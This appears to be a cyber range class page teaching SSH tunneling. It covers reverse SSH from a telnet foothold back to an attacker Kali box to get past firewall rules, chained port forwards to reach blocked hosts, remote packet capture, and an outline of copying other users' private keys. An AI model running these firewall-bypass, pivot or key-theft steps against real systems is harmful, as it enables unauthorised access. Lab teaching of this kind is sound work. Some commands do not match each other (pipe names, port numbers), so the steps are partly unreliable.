---
layout: default
title: Portalord
---

# Portalord    

**Focus**: Multi-plexing and tunneling

**Skill**: Reverse ssh, key-exchange, localhost chaining

**Activity**: Develop pathways to machines inaccesible from your host machine  

<div style="text-align: center;">
  <img src="{{ 'classes/Portalord/portalord_banner_v2.png' | relative_url }}" alt="Portalord Logo" style="max-width: 80%; height: auto;">
</div>

---
# Part 1: Reverse ssh by binding highport to blocked port
Use remote ssh to connect back to a localhost and get around ufw rules set up in the environment. This is helpful when firewall rules do not allow access to port 22 from the outside.


### On the ssh-closed-box (ubuntu)
Set up the ufw wirewalls to block all traffic to port 22
<div class="scroll-box">
sudo ufw deny 22
sudo ufw allow 23
sudo ufw enable
</div> 

Turn password authentication on for the ssh-closed-box.
<div class="scroll-box">
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div> 

Create a file that is only accessable to an ssh session by setting a "read only by owner" 
<div class="scroll-box">
echo "insert a flag here" > /home/ubuntu/ssh_flag.txt
chmod 600 /home/ubuntu/ssh_flag.txt
</div> 

chmod permissions: Read (r=4), Write (w=2), Execute (x=1)

- first int is the owner

- second int is the group

- third int is others

so 600 = 4+2 for the owner and 0 for group and 0 for everyone else

Create a user that can only access telnet specific files
<div class="scroll-box">
sudo adduser teluser
</div>  

- select a simple password (123)

set limited permissions for teluser

<div class="scroll-box">
sudo nano /usr/local/bin/telnet_shell.sh
</div>  
Put the following restrictions on the telnet users /bin/bash:
<div class="scroll-box">
#!/bin/bash
echo "You have limited access."
echo "You may only use: ls, cat"
export PATH=/usr/bin
exec /bin/bash --restricted
</div> 

install and open telnet services
<div class="scroll-box">
sudo apt update && sudo apt install telnetd -y && sudo apt install openbsd-inetd -y
</div> 

## On the attacker-box
Install telnet if needed:
<div class="scroll-box">
sudo apt update && sudo apt install telnet -y
</div>   

Turn on your ability to reverse ssh with a password:
<div class="scroll-box">
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div>  

Now telnet into the ssh-closed-box
<div class="scroll-box">
telnet x.x.x.x
</div>  
Now bind a local high port to local 22:
<div class="scroll-box">
ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.
</div>  
-N means --no-shell, -R means:--remote-port-forward

If it appears to "hang" you have an open connection

Now from a differnt terminal on you kali localhost
<div class="scroll-box">
ssh -p 2222 ubuntu@localhost
</div>  
What you are doing is connecting to your local port 2222, which has an open ssh session from the remote device. You are using that port 2222 to ssh to port 22 on the remote device which is only blocked at the firewall and not on the local machine. 

go and find your flag

# Part 2: Localhost ladders and Jumps

In this situation, you are going to access a box that is only accessible from another box. Setting up portbinding from localhost to allows you to create tunnels. This could be due to your ip being specifically banned, the protocols you need to use are blocked, or the box you are on is just a 'jumpbox' into another network that you do not have access to. The Jump option is fast and the Ladder option is more versitile... pick your poison. 

Step 1: Set up the environment that you will be laddering (at least two, so you will need a partner on the cyber.org range)

ubuntu 1: deny from attack box ip
<div class="scroll-box">
sudo ufw default allow incoming
sudo ufw deny from kali.1.ip.addr to any
sudo ufw deny from kali.2.ip.addr to any
sudo ufw enable
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div>

ubuntu 2: allow from attack box ip
<div class="scroll-box">
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div>  

kali 1: ladder method
<div class="scroll-box">
ssh -N -L 2223:localhost:22 ubuntu@al.lo.w.ip
</div>
- this ties your local loopback ip address port 2223 to your ubuntu@allowip port 22
- test the first step of the "ladder" with ssh -p 2223 ubuntu@localhost
<div class="scroll-box">
ssh -N -p 2223 -L 2224:de.ny.ip.addr:22 ubuntu@localhost
</div>
this window will hang- that is success.

open a new terminal
<div class="scroll-box">
ssh -p 2224 ubuntu@localhost
</div> 

kali 2: jump method
<div class="scroll-box">
ssh -J ubuntu@allowedIP ubuntu@blockedIP
</div>
<div class="scroll-box">
scp -J ubuntu@allowedIP ubuntu@blockedIP:/directory/file.txt /directory/to/local
</div> 

This is great for a single jump, but does not chain back, cannot be combined with reverse ssh tunnels and cannot use proxychains


# 3 wireshark
combining mkfifo wireshark capture to remote capture from chain ssh localhost:20001 "sudo tcpdump [flags]" /capturefifo

Ubuntu 1: deny from attack box IP
<div class="scroll-box">
sudo ufw default allow incoming
sudo ufw deny from kali.1.ip.addr to any
sudo ufw deny from kali.2.ip.addr to any
sudo ufw enable
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div>

Ubuntu 2: allow from attack box IP
<div class="scroll-box">
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div>

Kali 1: attack box
<div class="scroll-box">
Step 1) make your fifo pipe and remote capture
mkdir -p ~/Desktop/rc/
mkfifo ~/Desktop/rc/capture_pipe
</div>

Step 2) Starting Wireshark with -k and -i options
<div class="scroll-box">
sudo wireshark -k -i ~/Desktop/rc/tunnel_capture
</div>

Step 3) Make a ladder to your remote capture tunnel
<div class="scroll-box">
ssh -N -L 3301:localhost:22 ubuntu@al.lo.w.ip
</div>  
- for the the local port you pick does not matter, I try to keep them organized in a way I can remember (i.e. 33301 is the first box 33302 is the second... etc)
- it's good to always test your jumps by attempting to ssh -p xxxx user@localhost for each step.


Next make your ladder 'jump'
<div class="scroll-box">
ssh -N -p 3301 -L 3302:de.ny.ip.addr:22 ubuntu@localhost
</div> 

ssh -p 3302 ubuntu@localhost “sudo tcpdump -s 0 -U -n -w - -i ens5 not port 22” > ~/Desktop/rc/capture_pipe

# 4a rsakey gen
4a. using an rsa keygen to allow for access to device (rsa-keygen) 

4b. sharing the private key with teammates so they can also get into the device rapidly (this is both effective teamwork on the range and shows the dangers of sharing a private key) 

5. using a device to "pivot" from with an rsa.pub key on other device w/o password eg- ssh ubuntu@10.15.15.10 ubuntu@cyber_range $ ssh ubuntu@10.15.15.16 5b. tunneling all the way to an end of a chain and placing your rsa_pub key in the appropriate place to gain direct access 

6. getting access to the rsa_key on a device you are ssh in and copying it to your device to have their level of accesses.
7.
8. 7. using proxychains4 to use local tools on remote networks.
